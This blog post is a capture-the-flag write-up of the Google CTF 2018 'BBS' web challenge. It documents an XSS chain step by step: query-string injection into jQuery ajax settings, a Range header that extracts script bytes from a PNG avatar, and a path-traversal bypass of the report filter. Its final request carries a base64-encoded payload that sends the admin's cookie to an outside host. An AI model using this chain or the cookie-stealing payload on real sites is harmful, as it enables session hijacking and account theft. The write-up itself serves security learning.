---
layout: post
title: "GoogleCTF 2018 Quals: Web - BBS"
modified: 2018-06-30
tags: googlectf, gctf, gctf2018quals, web
---

Last weekend I played on the Google CTF 2018 Quals which was one of the best CTFs I played recently. They separated the easy challenges into a "beginner's quest" so we got only the medium-hard ones. I think this was a really good choice and made the whole CTF experience more pleasant. Also as with other CTFs, changing to dynamic scoring was also a welcomed change.

I started solving all the web challenges as our web guy was missing on Saturday and nobody else is really into web, and as I am kind of a jack of all trades when comes to CTFs, I looked into the web one. At the end (I mean at the _really_ end but I will talk about this later) we solved all the web challenges, including BBS which was only solved 3 teams at the end of the CTF.

![alt]({{ site.url }}/images/gctf2018quals/bbs_chall_desc.png)

# Introduction to the challenge

BBS was... well... a BBS ([wikipedia article](https://en.wikipedia.org/wiki/Bulletin_board_system)) in a form of really old school website.

![alt]({{ site.url }}/images/gctf2018quals/bbs_website.png)

The functionality of the website was really simple: you could register (`Home > New`), you could login (`Home > Open`), contact the admin (`Home > Contact` - this menu did not do anything, but more about later):

![alt]({{ site.url }}/images/gctf2018quals/bbs_menu.png)

After registering and logging in you could post to your board:

![alt]({{ site.url }}/images/gctf2018quals/bbs_signed_in.png)

You could also modify your profile settings:

![alt]({{ site.url }}/images/gctf2018quals/bbs_profile.png)

For avatar image only PNG files were accepted (really file type mattered, not the extension) but they were resized to 64x64 PNGs (in every case, even if you uploaded a PNG with the exact same size). The resized PNG was saved to `https://bbs.web.ctfcompetition.com/avatar/<md5_hash_of_the_resized_png>`

# Let's look under the hood!

So after the other web challenges (we solved this after the other 4 one) I first checked the headers, especially the [Content Security Policy header](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).

{% highlight text %} 
Content-Security-Policy: default-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline' 'unsafe-eval';
{% endhighlight %} 

This means if we found an XSS then we can inject `<script>` tags and execute code (that's the `unsafe-inline`), but only on the BBS challenge domain (because of the `self`) and we cannot communicate with other domains (eg. I could not download files from my domain).

The [website's source](view-source:https://bbs.web.ctfcompetition.com/) revealed that most of the logic was in the [app.js](https://bbs.web.ctfcompetition.com/assets/app.js) file.

We could find there that although the `Contact` menu item did not do anything we still have a report functionality which usually means we are talking about an XSS challenge or at least an XSS vulnerability is expected:

{% highlight javascript %}
function report(id) {
    $.post('/report', {
        'post': '/admin/' + id
    }).then(() => alert('Reported!'));
}
{% endhighlight %}

We did not have to search too much to find some clues what is expected from us to solve the challenge: you could link posts into other posts and when you hovered mouse above the 'quote' you could view the other post's content in an iframe:

![alt]({{ site.url }}/images/gctf2018quals/bbs_quote.png)

In the iframe the `/post?p=/ajax/post/4614877532389376` endpoint was called which executed the following logic:

{% highlight html %}
<script>$(document).ready(() => bbs.load_post());</script>
{% endhighlight %}

{% highlight javascript %}
function load_post() {
    var q = qs.parse(location.search, {ignoreQueryPrefix: true});
    var url = q.p;

    $.ajax(url).then((text) => {
        $('#post').html(atob(text));
    });
}
{% endhighlight %}

As the `url` parameter was an input from the query string we could modify the any other URL! Let's change it to our website (eg. kt.gy) and serve some nasty payload! Oh... wait... we cannot because of the CSP...

![alt]({{ site.url }}/images/gctf2018quals/bbs_csp.png)

((Yes, I know I did not update my Chrome in time, but I promise I will, okay???))

As the BBS server HTML-encoded every post response (after making them also [l33tsp43k](https://en.wikipedia.org/wiki/Leet)), we had to find some other way to inject our content.

There is the avatar upload of course, but we cannot make a PNG-Base64 [polyglot](https://en.wikipedia.org/wiki/Polyglot_(computing)) as the code called a base64 decode (`atob`) before injecting in the site as HTML.

But if we look at the code a little bit more we can see that the query string parsing using a module (`qs`) which handles creating objects if we use query string in the format like this:

{% highlight text %}
/post?p[key1]=value1&p[key2][subkey]=value2
{% endhighlight %}

This gives us the following object structure as `q`:

![alt]({{ site.url }}/images/gctf2018quals/bbs_qs.png)

[jQuery's ajax function](https://api.jquery.com/jquery.ajax/) although can accept an URL as the first parameter, but it can also accept a settings object where we can parameterize various aspects of the request including which URL to download, but we can also modify the request headers with the `headers` property. And there is this little header called [Range](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Range) where we can tell the server which part of the file we want to download (among others, this makes possible to continue downloading interrupted downloads).

_I hope you see where we are going... ;)_

# That moment when you feel you will solve this challenge soon

Yep, we can actually upload an avatar image and request just the part of it as our payload. :)

First I uploaded a random PNG and wanted to concat my payload character by character by using multiple ranges (which is allowed in the [Range header specification](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Range)), but unfortunately it did not work on the server as I got Internal Server Errors. So I had to upload a PNG file which contained my payload contiguously.

If I could make that I could just call the `/post` endpoint like below and my payload would have been executed as `$('#post').html(atob(text));` would interpret it as HTML and my `<script>` tag inside the HTML would execute:

{% highlight text %}
https://bbs.web.ctfcompetition.com/post?p[url]=/avatar/223d6cf0f4b320cdd3158927d5934634&p[headers][Range]=bytes=40-200
{% endhighlight %}

Now that we have to URL, we just have to send it to admin, right?

{% highlight javascript %}
function report(id) {
    $.post('/report', {
        'post': '/admin/' + id
    }).then(() => alert('Reported!'));
}
{% endhighlight %}

This allows us to only send post IDs, but of course we can call the `/report` endpoint directly:

{% highlight javascript %}
$.post('/report', { 'post': '/post?p[url]=/avatar/223d6cf0f4b320cdd3158927d5934634&p[headers][Range]=bytes=40-200' })
{% endhighlight %}

Hmmm the server responds to this request with `Invalid post` response. That's unfortunate.

On the other hand the `/admin` endpoint does not look too promising: even reporting a valid post does not seem to be working:

![alt]({{ site.url }}/images/gctf2018quals/bbs_report.png)

But even if this did work, we could not modify the `/post?p=` parameter.

Actually the solution is easier than thought, you the `/report` endpoint just checks that the url is in format `/admin/<id>`, so this URL will bypass the filter:

{% highlight javascript %}
$.post('/report', { 'post': '/admin/1/../../post?p[url]=/avatar/223d6cf0f4b320cdd3158927d5934634&p[headers][Range]=bytes=40-200' })
{% endhighlight %}

Okay, we put together everything, we spent only 1.5 hours solving the challenge till now, we just need a PNG image which contains our base64 payload. It should be simple, right?

# That moment when you feel you won't solve this challenge any time soon

Well yeah, it should be kind of simple. As mentioned earlier the uploaded PNG is resized every time and all the metadata (eg. comment sections) are dropped, only image data is used.

The image data is compressed with zlib. But if you use a high entropy input the compression engine will use the input bytes literally, so you can 'bypass' the compression part and inject your payload directly.

Or can you?

I've spend the next **3.5 hours** to create a PNG which contained my base64 payload. After creating approximately ~1369 PNG files, I gave up. ;)

The main problem was that the PNG encoder tries to minimalize the file size by [applying filtering](https://en.wikipedia.org/wiki/Portable_Network_Graphics#Filtering) to every row before sending into zlib. And I could choose any input filtering method for my payload to PNG encoder changed it something else.

I went so mad, I even thought it must be a custom PNG encoder created for this challenges just to make our job harder. As there was only 1 solve on the challenge that time I thought it could be a valid theory...

So I tried to experiment with various tricks to bypass this 'tricky converter' like generating such input which will contain my payload for every possible filter mode and stuff like that.

After the competition I spoke with the challenge author (phiber) and he told me this was of course not try, in the opposite he used the most generic conversion code that can be used:

{% highlight php %}
$im = imagecreatefrompng($path)
$resized = imagecreatetruecolor(64, 64);
imagecopyresampled($resized, $im, 0, 0, 0, 0, 64, 64, $width, $height);
{% endhighlight %}

Of course I did not know this that time, but...

![alt](http://i0.kym-cdn.com/entries/icons/original/000/000/554/picard-facepalm.jpg)

![alt](https://upload.wikimedia.org/wikipedia/commons/thumb/3/3b/Paris_Tuileries_Garden_Facepalm_statue.jpg/300px-Paris_Tuileries_Garden_Facepalm_statue.jpg)

![alt](http://shortyawards.imgix.net/entries/10th/a21d83f0-03a3-4432-b2de-a6eed73986ed.png?auto=format&fit=clip&w=540&s=1231f2f3505ffcd7611ff1343c6560b7)

![alt](http://i0.kym-cdn.com/photos/images/original/000/698/489/2f7.png)

# That moment when you've just given up

So it was only 30 minutes left from the Google CTF Quals and it was clear I won't be able to generate a correct PNG, but as a last time effort I looked into the code again...

Also I knew from the latest 3.5 hours of trying that I can inject smaller payload as that won't be changed, but the smallest base64 payload was not small enough. Maybe a raw JS payload?

{% highlight javascript %}
$(atob(location.hash.slice(1)))
{% endhighlight %}

But how to execute that?

It's simple! Just ask jQuery to do this for us by passing `dataType: "script"` to the `$.ajax` method!

And it worked!

This image:

![alt]({{ site.url }}/images/gctf2018quals/bbs_payload.png)

(you can find the `$(atob(location.hash.slice(1)))` between offsets 12326 - 12356)

and this URL finally made it possible to execute my XSS:

{% highlight text %}
https://bbs.web.ctfcompetition.com/post?p[url]=/avatar/0939691cf1a771225f6ba39bb9934686&p[headers][Range]=bytes=12326-12356&p[dataType]=script#PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpIC8+
{% endhighlight %}

The final step was just to send this URL to the admin:

{% highlight javascript %}
$.post('/report', { 'post': '/admin/1/../../post?p[url]=/avatar/0939691cf1a771225f6ba39bb9934686&p[headers][Range]=bytes=12326-12356&p[dataType]=script#PGltZyBzcmM9eCBvbmVycm9yPSJsb2NhdGlvbj0nLy9jdWJ5LmRhdGFnbG9iZS5ldS94L0ZMQUcnK2RvY3VtZW50LmNvb2tpZSIgLz4=' })
{% endhighlight %}

Which finally gave me the flag:

{% highlight text %}
CTF{yOu_HaVe_Been_b&}
{% endhighlight %}
